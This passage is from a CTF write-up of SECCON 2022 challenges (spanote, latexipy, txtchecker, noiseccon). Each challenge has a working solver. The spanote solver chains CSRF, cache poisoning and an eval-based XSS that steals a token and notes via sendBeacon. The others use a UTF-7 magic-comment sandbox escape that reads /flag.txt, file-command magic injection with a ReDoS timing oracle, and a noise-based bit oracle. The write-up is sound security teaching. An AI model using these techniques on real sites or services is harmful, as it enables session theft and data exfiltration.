GET /api/notes/<img src=0 onerror="alert(1)">.html
```
is `text/html`:

![](/images/2022/20221118-seccon-spanote-08.png)

If you render it by the above technique, a XSS occurs:

![](/images/2022/20221118-seccon-spanote-09.png)

#### Step 4: Code golf

Note that if the XSS payload is too long, you cannot use it as a part of URL and the XSS fails.
Implementation of fastify:

- https://github.com/delvedor/find-my-way/blob/v7.3.0/index.js#L87

The limitation is 100 characters, so you have to play code golf.

Example payload:
```
<img src=0 onerror="window.addEventListener('message',e=>eval(e.data))">.html
```

### Solver

`public/index.html`:
```html
<body>
  <script>
    const sleep = (msec) => new Promise((resolve) => setTimeout(resolve, msec));

    const deleteNote = (url, noteId) => {
      const form = document.createElement("form");
      form.action = url;
      form.method = "post";
      form.target = "_blank";

      const input = document.createElement("input");
      input.name = "noteId";
      input.value = noteId;
      form.appendChild(input);

      document.body.appendChild(form);
      form.submit();
    };

    const evilJs = `
      (async () => {
        const { token } = await (await fetch("/api/token")).json();

        const noteIds = await (
          await fetch("/api/notes", {
            headers: { "X-Token": token },
          })
        ).json();

        const notes = await Promise.all(
          noteIds.map((id) =>
            fetch("/api/notes/" + id, {
              headers: { "X-Token": token },
            }).then((res) => res.text())
          )
        );

        navigator.sendBeacon("${location.origin}", notes.join("\\n"));
      })();
    `;

    const main = async () => {
      const params = new URLSearchParams(location.search);
      const baseUrl = params.get("baseUrl");
      const noteId = params.get("noteId");

      {
        // Delete a note (and create a deleted page) with CSRF
        const url = `${baseUrl}/api/notes/delete`;
        deleteNote(url, noteId);
      }
      await sleep(1000);

      let evilWindow;
      {
        // Access to the deleted page with no token
        // Then, the browser will render a response with 500 status.
        const url = `${baseUrl}/api/notes/${noteId}`;
        evilWindow = open(url);
      }
      await sleep(1000);
      {
        // Open the bot's user page
        // Then, it will pollute the disk cache for the deleted page.
        evilWindow.location = baseUrl;
      }
      await sleep(1000);
      {
        // Access to the deleted page again using History API
        // Then, the browser will render the cached page and the XSS will occur!
        // Note that a bfcache will not be used because the page will have a window.opener reference.
        //   ref. https://web.dev/articles/bfcache#avoid_windowopener_references
        evilWindow.location = `${location.origin}/back.html?n=2`;
      }
      await sleep(1000);
      {
        // Send a JavaScript code via postMessage
        // Then, the XSS window will execute it!
        evilWindow.postMessage(evilJs, baseUrl);
      }
    };
    main();
  </script>
</body>
```

`public/back.html`:
```html
<script>
  const n = parseInt(new URLSearchParams(location.search).get("n"));
  history.go(-n);
</script>
```

`index.js`:
```javascript
const path = require("node:path");

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const SECCON_BASE_URL = process.env.SECCON_BASE_URL || fail("No SECCON_BASE_URL");
const ATTACK_BASE_URL = process.env.ATTACK_BASE_URL || fail("No ATTACK_BASE_URL");

if (!ATTACK_BASE_URL.startsWith("http://")) {
  fail("Invalid ATTACK_BASE_URL: the CSRF will fail");
}

const LISTEN_PORT = process.env.PORT || "8080";

const sleep = (msec) => new Promise((resolve) => setTimeout(resolve, msec));

const exploit = async () => {
  const noteId =
    // XSS payload:
    `<img src=0 onerror="window.addEventListener('message',e=>eval(e.data))">` +
    // .html -> Content-Type: text/html
    // ref. https://github.com/broofa/mime/blob/main/types/standard.js
    ".html";

  if (noteId.length > 100) {
    // ref. https://github.com/delvedor/find-my-way/blob/v7.3.0/index.js#L87
    fail(`Too long id: ${noteId}`);
  }
  if (
    noteId.includes("..") ||
    noteId.includes("/") ||
    noteId.includes("\\") ||
    noteId.includes("%")
  ) {
    fail(`Invalid id: ${noteId}`);
  }

  const baseUrl = "http://web:3000";

  const reportedUrl = `${ATTACK_BASE_URL}/index.html?${new URLSearchParams({
    baseUrl,
    noteId,
  })}`;

  const res = await (
    await fetch(`${SECCON_BASE_URL}/report`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        url: reportedUrl,
      }),
    })
  ).text();
  console.log(res); // "Received :)"
};

const fastify = require("fastify")();

fastify.register(require("@fastify/static"), {
  root: path.join(__dirname, "public"),
});

fastify.post("/", async (req, reply) => {
  // Received data from navigator.sendBeacon
  console.log(req.body); // Got a flag!
  process.exit(0);
});

const start = async () => {
  fastify.listen(
    { port: LISTEN_PORT, host: "0.0.0.0" },
    async (err, address) => {
      if (err) {
        fastify.log.error(err);
        process.exit(1);
      }

      await sleep(1 * 1000);
      await exploit();
      await sleep(10 * 1000);
      fail("Failed");
    }
  );
};
start();
```

### Flag

```
SECCON{hack3rs_po11ute_3verything_by_v4ri0us_meanS}
```

## [misc] latexipy

- 8 teams solved / 305 points
- https://github.com/arkark/my-ctf-challenges/tree/main/challenges/202211_SECCON_CTF_2022_Quals/misc/latexipy

Description:

> Latexify as a Service
>
> ```
> nc latexipy.seccon.games 2337
> ```

### Overview

The service returns a $\LaTeX$ expression for a given function.

For example:
```
$ nc latexipy.seccon.games 2337
Latexify as a Service!

E.g.
`` `
def solve(a, b, c):
    return (-b + math.sqrt(b**2 - 4*a*c)) / (2*a)
`` `
ref. https://github.com/google/latexify_py/blob/v0.1.1/examples/equation.ipynb

Input your function (the last line must start with __EOF__):
def f(x, y, z):
    return (x + y)*z
__EOF__

Result:
\mathrm{f}(x, y, z) \triangleq (x + y)z
```

Source code:
```python
import sys
import ast
import re
import tempfile
from importlib import util


def get_fn_name(source: str) -> str | None:
    root = ast.parse(source)
    if type(root) is not ast.Module:
        return None
    if len(root.body) != 1:
        return None

    fn = root.body[0]
    if type(fn) is not ast.FunctionDef:
        return None

    fn.body.clear()
    if not re.fullmatch(r"def \w+\((\w+(, \w+)*)?\):", ast.unparse(fn)):
        # You must define a function without decorators, type annotations, and so on.
        return None

    return str(fn.name)


print("""
Latexify as a Service!

E.g.
`` `
def solve(a, b, c):
    return (-b + math.sqrt(b**2 - 4*a*c)) / (2*a)
`` `
ref. https://github.com/google/latexify_py/blob/v0.1.1/examples/equation.ipynb

Input your function (the last line must start with __EOF__):
""".strip(), flush=True)

source = ""
while True:
    line = sys.stdin.readline()
    if line.startswith("__EOF__"):
        break
    source += line

name = get_fn_name(source)
if name is None:
    print("Invalid source")
    exit(1)

source += f"""
import latexify
__builtins__["print"](latexify.get_latex({name}))
"""

with tempfile.NamedTemporaryFile(suffix=".py") as file:
    file.write(source.encode())
    file.flush()

    print()
    print("Result:")
    spec = util.spec_from_file_location("tmp", file.name)
    spec.loader.exec_module(util.module_from_spec(spec))
```

Flag location: `/flag.txt`

### Solution

```python
def get_fn_name(source: str) -> str | None:
    root = ast.parse(source)
    if type(root) is not ast.Module:
        return None
    if len(root.body) != 1:
        return None

    fn = root.body[0]
    if type(fn) is not ast.FunctionDef:
        return None

    fn.body.clear()
    if not re.fullmatch(r"def \w+\((\w+(, \w+)*)?\):", ast.unparse(fn)):
        # You must define a function without decorators, type annotations, and so on.
        return None

    return str(fn.name)
```
The limitation using AST prevents trivial RCEs.

As a important point, `ast.parse` ignores comments in the source code. By the way, Python has a feature called **magic comment**:

- https://docs.python.org/3/reference/lexical_analysis.html#encoding-declarations
- https://docs.python.org/3/library/codecs.html#standard-encodings

Magic comment is just a comment in `get_fn_name`, but it is recognized as a magic comment for module imports:
```python
    spec = util.spec_from_file_location("tmp", file.name)
    spec.loader.exec_module(util.module_from_spec(spec))
```

In fact, you can bypass it with UTF-7:
```
# coding: utf_7
def f(x):
    return x
    #+AAo-print(open("/flag.txt").read())
__EOF__
```

`+AAo-` is `\n` on the UTF-7 encoding, and the above code as a module is:
```python
def f(x):
    return x

print(open("/flag.txt").read())
```

It is also possible to bypass it using other encodings, e.g. `raw_unicode_escape` and `unicode_escape`.

### Solver

```python
import os
import pwn

io = pwn.remote(os.getenv("SECCON_HOST"), os.getenv("SECCON_PORT"))

assert b"+AAo-".decode("utf_7") == "\n"

payload = """
# -*- coding: utf_7 -*-
def f(x):
    return x
    #+AAo-print(open("/flag.txt").read())
""".lstrip()

payload += "__EOF__"

io.sendlineafter(b"__EOF__):", payload.encode())

print(io.recvall().decode())
```

### Flag

```
SECCON{UTF7_is_hack3r_friend1y_encoding}
```

## [misc] txtchecker

- 23 teams solved / 193 points
- https://github.com/arkark/my-ctf-challenges/tree/main/challenges/202211_SECCON_CTF_2022_Quals/misc/txtchecker

Description:

> I'm creating a text file checker. It still in the process of implementation...
>
> ```
> sshpass -p ctf ssh -oStrictHostKeyChecking=no -oCheckHostIP=no ctf@txtchecker.seccon.games -p 2022
> ```

### Overview

Source code (a bash script):
```bash
#!/bin/bash

read -p "Input a file path: " filepath
file $filepath 2>/dev/null | grep -q "ASCII text" 2>/dev/null

# TODO: print the result the above command.
#   $? == 0 -> It's a text file.
#   $? != 0 -> It's not a text file.
exit 0
```
There are only three lines!
The server executes the script when a player logins with SSH.

Flag location: `/flag.txt`

### Solution

#### Step 1: Magic file injection

You can specify the arguments of the file command.

`man file`:
```
     -m, --magic-file magicfiles
             Specify an alternate list of files and directories containing magic.  This can be a single item,
             or a colon-separated list.  If a compiled magic file is found alongside a file or directory, it
             will be used instead.
```

You can specify a magic file with `-m` option and some special files (e.g. `/dev/tty` and `/proc/self/fd/0`).

However, you cannot get the result of the file command somce the server does not output anything.

#### Step 2: A time-based attack with ReDoS

`man magic`:
```
              regex       A regular expression match in extended POSIX regular expression syntax (like egrep).
                          Regular expressions can take exponential time to process, and their performance is
                          hard to predict, so their use is discouraged.  When used in production environments,
                          their performance should be carefully checked.  The size of ... snip ...
```
You can use `regex`, so you can also do ReDoS! Try a time-based attack with ReDoS.

### Solver

```python
import string
import os
import pwn
import time

REDOS_POWER = 20
TIMEOUT = 20

SSH_CMD = f"sshpass -p ctf ssh -oStrictHostKeyChecking=no -oCheckHostIP=no ctf@{os.getenv('SECCON_HOST')} -p {os.getenv('SECCON_PORT')}"


def get_time(rule: str) -> bool:
    io = pwn.process(SSH_CMD, shell=True, stdin=pwn.PTY, raw=False)
    io.sendlineafter(b"Input a file path: ", b"-m /dev/tty /flag.txt")
    io.sendline(rule.encode())
    for i in range(REDOS_POWER):
        io.sendline(f">0 regex \\^(((((((((((((((((((((((((((((.*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*@ ReDoS-{i}".encode())
    io.recvuntil(f"ReDoS-{REDOS_POWER - 1}".encode(), timeout=TIMEOUT)
    io.send("\x04")  # Ctrl+D

    t1 = time.time()
    io.recvall(timeout=TIMEOUT)
    t2 = time.time()
    io.close()
    return t2 - t1


def get_rule(index: int, next_chars: str) -> str:
    def escape(s): return s.replace("{", "\\\\{").replace("}", "\\\\}")
    expr = "".join([
        "\\^",
        "[",
        escape(next_chars),
        "]"
    ])
    return f"{index} regex {expr}"


CHARS = "_}" + string.ascii_letters + string.digits

flag = "SECCON{"
while not flag.endswith("}"):
    left = 0
    right = len(CHARS)
    while right - left > 1:
        mid = (left + right)//2
        t_left = get_time(get_rule(len(flag), CHARS[:mid]))
        t_right = get_time(get_rule(len(flag), CHARS[mid:]))
        print(f"{t_left = }, {t_right = }")
        if t_left > t_right:
            right = mid
        else:
            left = mid
    flag += CHARS[left]
    print(flag)
print(f"{flag = }")
```

### Flag

```
SECCON{reDo5L1fe}
```

## [misc] noiseccon

- 22 teams solved / 197 points
- https://github.com/arkark/my-ctf-challenges/tree/main/challenges/202211_SECCON_CTF_2022_Quals/misc/noiseccon

Description:

> Noise! Noise! Noise!
>
> ```
> nc noiseccon.seccon.games 1337
> ```

### Overview

```
$ nc noiseccon.seccon.games 1337
   _   _       _             ____                           _
  | \ | | ___ (_)___  ___   / ___| ___ _ __   ___ _ __ __ _| |_ ___  _ __
  |  \| |/ _ \| / __|/ _ \ | |  _ / _ \ '_ \ / _ \ '__/ _` | __/ _ \| '__|
  | |\  | (_) | \__ \  __/ | |_| |  __/ | | |  __/ | | (_| | || (_) | |
  |_| \_|\___/|_|___/\___|  \____|\___|_| |_|\___|_|  \__,_|\__\___/|_|

Flag length: 21
Image width: 256
Image height: 256
Scale x: 1
Scale y: 2
UklGRoo7AABXRUJQVlA4TH07AAAv/8A/AM0ABDHgf9pA... snip (base64 of an image data) ...5SImJZRsMGAA==
```

Source code:
```javascript
const { noise } = require("./perlin.js");
const sharp = require("sharp");
const crypto = require("node:crypto");
const readline = require("node:readline").promises;

const FLAG = process.env.FLAG ?? console.log("No flag") ?? process.exit(1);
const WIDTH = 256;
const HEIGHT = 256;

console.log(
  `   _   _       _             ____                           _
  | \\ | | ___ (_)___  ___   / ___| ___ _ __   ___ _ __ __ _| |_ ___  _ __
  |  \\| |/ _ \\| / __|/ _ \\ | |  _ / _ \\ '_ \\ / _ \\ '__/ _\` | __/ _ \\| '__|
  | |\\  | (_) | \\__ \\  __/ | |_| |  __/ | | |  __/ | | (_| | || (_) | |
  |_| \\_|\\___/|_|___/\\___|  \\____|\\___|_| |_|\\___|_|  \\__,_|\\__\\___/|_|
  `
);

console.log(`Flag length: ${FLAG.length}`);
console.log(`Image width: ${WIDTH}`);
console.log(`Image height: ${HEIGHT}`);

const paddedFlag = [
  ...crypto.randomBytes(8), // random prefix
  ...Buffer.from(FLAG),
  ...crypto.randomBytes(8), // random suffix
];

// bytes_to_long
let flagInt = 0n;
for (const b of Buffer.from(paddedFlag)) {
  flagInt = (flagInt << 8n) | BigInt(b);
}

const generateNoise = async (scaleX, scaleY) => {
  const div = (x, y) => {
    const p = 4;
    return Number(BigInt.asUintN(32 + p, (x * BigInt(1 << p)) / y)) / (1 << p);
  };

  const offsetX = div(flagInt, scaleX);
  const offsetY = div(flagInt, scaleY);

  noise.seed(crypto.randomInt(65536));
  const colors = [];
  for (let y = 0; y < HEIGHT; y++) {
    for (let x = 0; x < WIDTH; x++) {
      let v = noise.perlin2(offsetX + x * 0.05, offsetY + y * 0.05);
      v = (v + 1.0) * 0.5; // [-1, 1] -> [0, 1]
      colors.push((v * 256) | 0);
    }
  }

  const image = await sharp(Uint8Array.from(colors), {
    raw: {
      width: WIDTH,
      height: HEIGHT,
      channels: 1,
    },
  })
    .webp({ lossless: true })
    .toBuffer();
  return image;
};

const main = async () => {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    terminal: false,
  });

  const toBigInt = (value) => {
    if (value.length > 100) {
      console.log(`Invalid value: ${value}`);
      process.exit(1);
    }
    const result = BigInt(value);
    if (result <= 0n) {
      console.log(`Invalid value: ${value}`);
      process.exit(1);
    }
    return result;
  };

  const query = async () => {
    const scaleX = toBigInt(await rl.question("Scale x: "));
    const scaleY = toBigInt(await rl.question("Scale y: "));

    const image = await generateNoise(scaleX, scaleY);
    console.log(image.toString("base64"));
  };
  await query();

  rl.close();
};

main();
```

The server returns a noise image using https://github.com/josephg/noisejs.

Example noise:
![](/images/2022/20221118-seccon-noiseccon-01.png)

The noise is generated with an algorithm called Perlin noise:

- https://en.wikipedia.org/wiki/Perlin_noise



### Solution

#### Step 1: Finding coordinates of lattice

```javascript
  const offsetX = div(flagInt, scaleX);
  const offsetY = div(flagInt, scaleY);

  noise.seed(crypto.randomInt(65536));
  const colors = [];
  for (let y = 0; y < HEIGHT; y++) {
    for (let x = 0; x < WIDTH; x++) {
      let v = noise.perlin2(offsetX + x * 0.05, offsetY + y * 0.05);
      v = (v + 1.0) * 0.5; // [-1, 1] -> [0, 1]
      colors.push((v * 256) | 0);
    }
  }
```
`flagInt`/`scakeX`/`scaleY` affect only the offsets of the noise. In other words, you may extract flag information from the "position" of a noise.

Implementation of Perlin noise:
```javascript
// From: https://github.com/josephg/noisejs/blob/master/perlin.js#L250-L273

  // 2D Perlin Noise
  module.perlin2 = function(x, y) {
    // Find unit grid cell containing point
    var X = Math.floor(x), Y = Math.floor(y);
    // Get relative xy coordinates of point within that cell
    x = x - X; y = y - Y;
    // Wrap the integer cells at 255 (smaller integer period can be introduced here)
    X = X & 255; Y = Y & 255;

    // Calculate noise contributions from each of the four corners
    var n00 = gradP[X+perm[Y]].dot2(x, y);
    var n01 = gradP[X+perm[Y+1]].dot2(x, y-1);
    var n10 = gradP[X+1+perm[Y]].dot2(x-1, y);
    var n11 = gradP[X+1+perm[Y+1]].dot2(x-1, y-1);

    // Compute the fade curve value for x
    var u = fade(x);

    // Interpolate the four results
    return lerp(
        lerp(n00, n10, u),
        lerp(n01, n11, u),
       fade(y));
  };
```

Each gradient `gradP` is defined on a seed value, and `parlin2(x, y)` is computed using the gradients of four neighbour lattice points of `(x, y)`. The value is in $\left[-1, 1\right]$.

Also, each gradient is selected randomly from:
```javascript
  var grad3 = [new Grad(1,1,0),new Grad(-1,1,0),new Grad(1,-1,0),new Grad(-1,-1,0),
               new Grad(1,0,1),new Grad(-1,0,1),new Grad(1,0,-1),new Grad(-1,0,-1),
               new Grad(0,1,1),new Grad(0,-1,1),new Grad(0,1,-1),new Grad(0,-1,-1)];
```

We are considering two dimensions in this challenge, so the candidates of gradients are as follows:

$$
\begin{pmatrix}1\\1\end{pmatrix}, \begin{pmatrix}-1\\1\end{pmatrix}, \begin{pmatrix}1\\-1\end{pmatrix}, \begin{pmatrix}-1\\-1\end{pmatrix}, \begin{pmatrix}1\\0\end{pmatrix}, \begin{pmatrix}-1\\0\end{pmatrix}, \begin{pmatrix}0\\1\end{pmatrix}, \begin{pmatrix}0\\-1\end{pmatrix}
$$

Herein, consider the following state:

- `gradP[X+perm[Y]]` $= \begin{pmatrix}0\\ \plusmn 1\end{pmatrix}$
- `gradP[X+1+perm[Y]]` $= \begin{pmatrix}0\\ \plusmn 1\end{pmatrix}$

Then,

$$
\forall x\in \left[X, X+1\right], \mathtt{perlin2}(x, Y) = 0\textrm{.}
$$

Proof:

For $\forall x\in \left[X, X+1\right]$,

- `n00`: $n_{00} = \begin{pmatrix}0\\\plusmn 1\end{pmatrix} \cdot \begin{pmatrix}x - \lfloor x \rfloor \\ Y - \lfloor Y \rfloor\end{pmatrix} = \begin{pmatrix}0\\\plusmn 1\end{pmatrix} \cdot \begin{pmatrix}x - \lfloor x \rfloor \\ 0\end{pmatrix} = 0$
- `n10`: $n_{10} = \begin{pmatrix}0\\\plusmn 1\end{pmatrix} \cdot \begin{pmatrix}x - \lfloor x \rfloor -1 \\ Y - \lfloor Y \rfloor\end{pmatrix} = \begin{pmatrix}0\\\plusmn 1\end{pmatrix} \cdot \begin{pmatrix}x - \lfloor x \rfloor -1 \\ 0\end{pmatrix} = 0$

and $\mathtt{fade}(Y - \lfloor Y \rfloor) = 0$. So,

$$
\mathtt{perlin2}(x, Y) = \mathtt{lerp}\left(n_{00}, n_{10}, \mathtt{fade}(x - \lfloor x \rfloor) \right) = \mathtt{lerp}\left(0, 0, \mathtt{fade}(x - \lfloor x \rfloor) \right) = 0 \,{}_\blacksquare
$$

Conversely, it is not true in general at other cases.

Thus, if the size of the interval of $x$ such that each $\mathtt{perlin2}(x, y_0)$ is $0$ with a fixed integer $y_0$ is $1$, let $x_0$ be an endpoint of the interval. Then, $(x_0, y_0)$ is one of the lattice points with high probability.

The source code for the experiment:
```javascript
const { noise } = require("./perlin.js");
const nodeplotlib = require("nodeplotlib");
const crypto = require("node:crypto");

noise.seed(crypto.randomInt(65536));
console.log(noise);

const values = [];

const y0 = 0;
for (let i = 0; i < 1000; i++) {
  const x = i * 0.01;
  const v = noise.perlin2(x, y0);
  values.push(v);
}

const data = [
  {
    x: [...values.keys()],
    y: values,
    type: "scatter",
  },
];
nodeplotlib.plot(data);
```

![](/images/2022/20221118-seccon-noiseccon-02.png)

The result show an interval between `x=400` and `x=500` as a the lattice size. So you can find the "position" of the lattice.

#### Step 2: An oracle for each bit

Source code:
```javascript
  const div = (x, y) => {
    const p = 4;
    return Number(BigInt.asUintN(32 + p, (x * BigInt(1 << p)) / y)) / (1 << p);
  };

  const offsetX = div(flagInt, scaleX);
  const offsetY = div(flagInt, scaleY);

  noise.seed(crypto.randomInt(65536));
  const colors = [];
  for (let y = 0; y < HEIGHT; y++) {
    for (let x = 0; x < WIDTH; x++) {
      let v = noise.perlin2(offsetX + x * 0.05, offsetY + y * 0.05);
      v = (v + 1.0) * 0.5; // [-1, 1] -> [0, 1]
      colors.push((v * 256) | 0);
    }
  }
```

For `noise.perlin2(offsetX + x * 0.05, offsetY + y * 0.05)`, The `offsetX` and `offsetY` contribute only their fractional parts to the position of lattice.

Based on these factors, you can construct an oracle to identify 0/1 for each bit of a flag. Please see the following solver for details.

### Solver

```python
from concurrent.futures import ThreadPoolExecutor
from Crypto.Util.number import long_to_bytes, bytes_to_long
from PIL import Image
import pwn
from io import BytesIO
import base64
import os

LATTICE_SIZE = 20  # = 1 / 0.05

with pwn.remote(os.getenv('SECCON_HOST'), os.getenv('SECCON_PORT')) as io:
    io.recvuntil(b"Flag length: ")
    flag_bit_len = int(io.recvline().decode())*8
    io.recvuntil(b"Image width: ")
    width = int(io.recvline().decode())
    io.recvuntil(b"Image height: ")
    height = int(io.recvline().decode())


def get_image(scale_x, scale_y) -> Image:
    io = pwn.remote(os.getenv('SECCON_HOST'), os.getenv('SECCON_PORT'))
    io.sendlineafter(b"Scale x: ", str(scale_x).encode())
    io.sendlineafter(b"Scale y: ", str(scale_y).encode())
    binary = base64.b64decode(io.recvline().strip().decode())
    io.close()
    return Image.open(BytesIO(binary), formats=["webp"])


def oracle(bit_index: int) -> bool:
    scale_x = 2**(bit_index + 1)
    scale_y = 1

    for _ in range(10):
        img = get_image(scale_x, scale_y)
        # img.save("output.webp")
        data = list(img.getdata())
        assert len(data) == width*height

        for y in range(0, height, LATTICE_SIZE):
            cnt = 0
            for x in range(width):
                color = data[y*width + x][0]
                if abs(color - 128) == 0:
                    cnt += 1
                else:
                    if 0 <= cnt - LATTICE_SIZE < 2:
                        i = (x - cnt - 2) % LATTICE_SIZE
                        return i < LATTICE_SIZE/2
                    cnt = 0
    print("Failed")
    exit(1)


padded_bit_len = 8*8

flag = 0
with ThreadPoolExecutor(max_workers=8) as executor:
    bits = executor.map(oracle, range(padded_bit_len, padded_bit_len + flag_bit_len))
for index, bit in enumerate(bits):
    flag |= bit << index

print(long_to_bytes(flag))
```

### Flag

```
SECCON{p3RLin_W0r1d!}
```
